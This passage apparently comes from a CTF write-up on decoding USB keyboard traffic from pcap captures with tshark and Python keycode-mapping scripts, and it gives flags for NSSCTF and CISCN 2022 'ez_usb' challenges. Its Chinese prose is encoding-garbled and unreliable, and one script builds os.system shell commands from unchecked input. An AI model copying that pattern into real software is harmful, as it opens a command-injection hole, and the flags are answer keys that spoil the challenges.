class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># check argv</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage : &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;        python UsbKeyboardHacker.py data.pcap&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Tips : &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;        To use this python script , you must install the tshark first.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;        You can use `sudo apt-get install tshark` to install it&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Author : &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;        WangYihang &lt;wangyihanger@gmail.com&gt;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;        If you have any questions , please contact me by email.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;        Thank you for using.&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get argv</span></span><br><span class="line">    pcapFilePath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># get data of pcap</span></span><br><span class="line">    os.system(<span class="string">&quot;tshark -r %s -T fields -e usb.capdata &#x27;usb.data_len == 8&#x27; &gt; %s&quot;</span> % (pcapFilePath, DataFileName))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># read data</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(DataFileName, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            presses.append(line[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># handle</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> press <span class="keyword">in</span> presses:</span><br><span class="line">        <span class="keyword">if</span> press == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;:&#x27;</span> <span class="keyword">in</span> press:</span><br><span class="line">            Bytes = press.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Bytes = [press[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(press), <span class="number">2</span>)]</span><br><span class="line">        <span class="keyword">if</span> Bytes[<span class="number">0</span>] == <span class="string">&quot;00&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">&quot;00&quot;</span> <span class="keyword">and</span> normalKeys.get(Bytes[<span class="number">2</span>]):</span><br><span class="line">                result += normalKeys[Bytes[<span class="number">2</span>]]</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">int</span>(Bytes[<span class="number">0</span>],<span class="number">16</span>) &amp; <span class="number">0b10</span> <span class="keyword">or</span> <span class="built_in">int</span>(Bytes[<span class="number">0</span>],<span class="number">16</span>) &amp; <span class="number">0b100000</span>: <span class="comment"># shift key is pressed.</span></span><br><span class="line">            <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">&quot;00&quot;</span> <span class="keyword">and</span> normalKeys.get(Bytes[<span class="number">2</span>]):</span><br><span class="line">                result += shiftKeys[Bytes[<span class="number">2</span>]]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Unknow Key : %s&quot;</span> % (Bytes[<span class="number">0</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Found : %s&quot;</span> % (result))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># clean the temp data</span></span><br><span class="line">    os.system(<span class="string">&quot;rm ./%s&quot;</span> % (DataFileName))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="/img/1721631569202-9.png" alt="img"></p><p>ujkonjk,tfvbhyhjipokrdcvgrdcvgpokqwsztfvbhujkowazxdqasewsdrpokxdfviklpnjkwsdrrfgyrdcvguhnmkbhjmyhji</p><p>æ ¹æ®é”®ç›˜ä¸Šæ‰€åŒ…å›´ä½çš„æ‰¾å‡ºæ‰€å¯¹åº”çš„å­—ç¬¦ï¼Œä¾‹å¦‚ï¼šujkoæ‰€åŒ…å›´çš„å­—ç¬¦æ˜¯i</p><p>im gulf flag is welcome t fjnu</p><p>NSSCTF{welcome to fjnu}</p><h3 id="CISCN-2022-åˆèµ›-ez-usb"><a href="#CISCN-2022-åˆèµ›-ez-usb" class="headerlink" title="[CISCN 2022 åˆèµ›]ez_usb"></a>[CISCN 2022 åˆèµ›]ez_usb</h3><p>wiresharké‡Œåˆ†æå¯ä»¥ä¸ºusbä¸­çš„é”®ç›˜æµé‡</p><p><img src="/img/1721631569201-1.png" alt="img"></p><p>æœç´¢8ä¸ªé•¿åº¦çš„å­—èŠ‚åŒ…,å¯ä»¥å‘ç°å…¶æœ‰2.8.1å’Œ2.10.1</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">usb.data_len == <span class="number">8</span></span><br></pre></td></tr></table></figure><p><img src="/img/1721631569201-2.png" alt="img"></p><p>ä½¿ç”¨tsharkå°†å…¶å¯¼å‡º</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">tshark -r <span class="number">2.</span>pcapng -T fields -e usbhid.data -Y <span class="string">&quot;usb.data_len == 8&quot;</span> -Y <span class="string">&#x27;usb.src ==&quot;2.8.1&quot;&#x27;</span> &gt; <span class="number">1.</span>txt</span><br><span class="line">tshark -r <span class="number">2.</span>pcapng -T fields -e usbhid.data -Y <span class="string">&quot;usb.data_len == 8&quot;</span> -Y <span class="string">&#x27;usb.src ==&quot;2.10.1&quot;&#x27;</span>&gt; <span class="number">2.</span>txt</span><br></pre></td></tr></table></figure><p><img src="/img/1721631569201-3.png" alt="img"></p><p><img src="/img/1721631569201-4.png" alt="img"></p><p>ç”±äºå¯¼å‡ºæ•°æ®æ²¡æœ‰åŠ ï¼šæ‰€ä»¥æˆ‘ä»¬è¦ç»™å…¶åŠ ä¸Šï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;3.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out3.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">16</span>: <span class="comment"># é¼ æ ‡æµé‡çš„è¯lenæ”¹ä¸º8</span></span><br><span class="line">            out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">            fi.write(out)</span><br><span class="line">            fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/img/1721631569201-5.png" alt="img"></p><p>é”®ç›˜æµé‡è½¬åŒ–ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">out</span>(<span class="params">file</span>):</span><br><span class="line">    keys=<span class="built_in">open</span>(file)</span><br><span class="line">    output = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">                 <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">                output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    keys.close()</span><br><span class="line">    </span><br><span class="line">    flag=<span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">del</span> output[a]</span><br><span class="line">            <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">                flag+=<span class="number">1</span></span><br><span class="line">                output.pop(i)</span><br><span class="line">                <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                    flag=<span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> flag!=<span 